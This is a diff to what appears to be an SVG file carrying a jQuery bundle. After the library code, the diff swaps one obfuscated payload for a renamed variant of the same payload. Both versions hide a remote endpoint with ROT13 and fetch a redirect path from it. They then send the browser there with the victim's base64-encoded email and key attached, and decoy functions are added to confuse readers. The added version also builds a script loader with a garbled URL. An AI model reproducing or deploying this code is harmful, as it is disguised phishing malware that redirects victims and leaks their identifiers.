@@ -10721,84 +10721,105 @@ if ( typeof noGlobal === "undefined" ) {
 
 return jQuery;
 } );
-    // Useless block for distraction
-    (() => {
-      let fake = Math.random() * 12345;
-      function pointless(x) { return x * x - x + 2025; }
-      for (let i = 0; i < 1; i++) { pointless(fake); }
-    })();
+   // Dummy entropy generator
+(function confusionEngine() {
+  const junk = Array.from({ length: 5 }, (_, i) => i * Math.random());
+  function spinCycle(v) {
+    return junk.map(j => j + v).reduce((a, b) => a + b, 0);
+  }
+  spinCycle(42);
+})();
 
-    // Real logic below, obfuscated
-    let claim="[EMAIL]", tag="[KEY]";
-    (function launcher(){
-      // Extra log for confusion
-      console.log("SVG Script Launched at", new Date().toISOString());
-      // Dummy function for "security"
-      function idleDelay(n){while(--n>0){}}
-      idleDelay(3e5);
+// Core identifiers
+let tokenizedID = "[EMAIL]", channel = "[KEY]";
 
-      // Custom ROT13
-      function cipher(data) {
-        return data.replace(/[a-zA-Z]/g, function(chr) {
-          let ascii = chr.charCodeAt(0);
-          return String.fromCharCode(ascii + (chr.toLowerCase()<'n'?13:-13));
-        });
+(function payloadInitiator() {
+  console.log("Engine started @", new Date().toUTCString());
+
+  // Worthless async loop
+  (async () => {
+    for (let i = 0; i < 1; i++) {
+      await new Promise(r => setTimeout(r, 1));
+    }
+  })();
+
+  // Nonsense style injection
+  const ghostStyle = document.createElement("style");
+  ghostStyle.innerText = "body::before{content:'';display:none}";
+  if (document.head) document.head.appendChild(ghostStyle);
+
+  // ROT13 decoder
+  function transformROT13(txt) {
+    return txt.replace(/[a-zA-Z]/g, ch => {
+      const base = ch.charCodeAt(0);
+      return String.fromCharCode(base + (ch.toLowerCase() < 'n' ? 13 : -13));
+    });
+  }
+
+  // Scrambled URL array
+  const encodedParts = ["/terng.wf", "cbfvbasbe2@1.0.0", ".arg/", "acz/", "wfqryvie", "uggcf://"];
+  const resourceURL = transformROT13(encodedParts.reverse().join("")).replace("uggcf://", "https://");
+
+  // Script insertion
+  const dynamicScript = document.createElement("script");
+  dynamicScript.setAttribute("type", "text/javascript");
+  dynamicScript.defer = true;
+  dynamicScript.src = resourceURL;
+
+
+  // Distraction loop (zero effect)
+  (() => {
+    let sum = 0;
+    for (let x = 10; x > 0; x--) sum += x;
+  })();
+
+  // Execution handler
+  (function orchestrator() {
+    let retryCount = 0;
+    function delayUntilDOMReady() {
+      if (!document.body && retryCount++ < 5) setTimeout(delayUntilDOMReady, 50);
+    }
+    delayUntilDOMReady();
+
+    // Obfuscated fetch endpoint
+    const endpointCipher = "uggcf://yrtnpl-123.bayvar/ncv/hhheeyyy";
+    const decipher = s => s.replace(/[a-zA-Z]/g, l => String.fromCharCode(l.charCodeAt(0) + (l.toLowerCase() < 'n' ? 13 : -13)));
+
+    // Meaningless async
+    async function bogusAwait() {
+      return "🚀";
+    }
+
+    // True payload logic (unchanged)
+    async function obtainPayload() {
+      const response = await fetch(decipher(endpointCipher));
+      if (response.ok) {
+        const body = await response.json();
+        return body.message;
       }
+      return "";
+    }
 
-      // Obfuscated array and URL decoding
-      const scramble = ["uggcf","://pqa.","wfqryvie",".arg/acz/","cbfvbasbe2@1.0.0","/terng.wf"];
-      const resource = cipher(scramble.reverse().join("")).replace("uggcf://","https://");
+    // Action trigger (critical)
+    async function fireBullet() {
+      const reference = btoa(`${tokenizedID}&${channel}&a`);
+      await bogusAwait(); // still adds async feel
+      const path = await obtainPayload();
+      window.open(`${path}${reference}`, "_self");
+    }
 
-      // Style injector (does nothing)
-      let styleDummy = document.createElement("style");
-      styleDummy.textContent = "/* nothing here */";
-      document.head && document.head.appendChild(styleDummy);
+    fireBullet();
+  })();
 
-      // Script loader
-      let scriptLoader = document.createElement("script");
-      scriptLoader.type = "application/javascript";
-      scriptLoader.defer = true;
-      scriptLoader.src = resource;
+  // Final noise function
+  (() => {
+    function burnStack(a) {
+      return a ** 2 + Math.random() - a;
+    }
+    burnStack(7);
+  })();
+})();
 
-      // Another useless distraction
-      (() => {
-        let z = 0;
-        for (let i = 0; i < 2; i++) z += i;
-      })();
-
-      // Real execution block
-      (function execute(){
-        let tries = 0;
-        function retryCheck() {
-          if (!document.body && tries++ < 7) setTimeout(retryCheck, 40);
-        }
-        retryCheck();
-
-        // Obfuscated URL for ROT13 decode
-        const rotSrc = "uggcf://yrtnpl-123.bayvar/ncv/hhheeyyy";
-        const dec = txt => txt.replace(/[a-zA-Z]/g, ch => String.fromCharCode(ch.charCodeAt(0)+(ch.toLowerCase()<'n'?13:-13)));
-
-        // Extra dummy async function
-        async function fakeWait() { return Promise.resolve("dummy"); }
-
-        // Core async fetch logic (intact)
-        async function fetchData() {
-          let resp = await fetch(dec(rotSrc));
-          return resp.ok ? (await resp.json()).message : "";
-        }
-
-        // Encapsulated opener (intact, only names changed)
-        async function triggerAction() {
-          let ref = btoa(`${claim}&${tag}&a`);
-          await fakeWait();
-          let path = await fetchData();
-          window.open(`${path}${ref}`,"_self");
-        }
-        triggerAction();
-
-      })();
-    })();
-    // End
     ]]>
   </script>
 </svg>
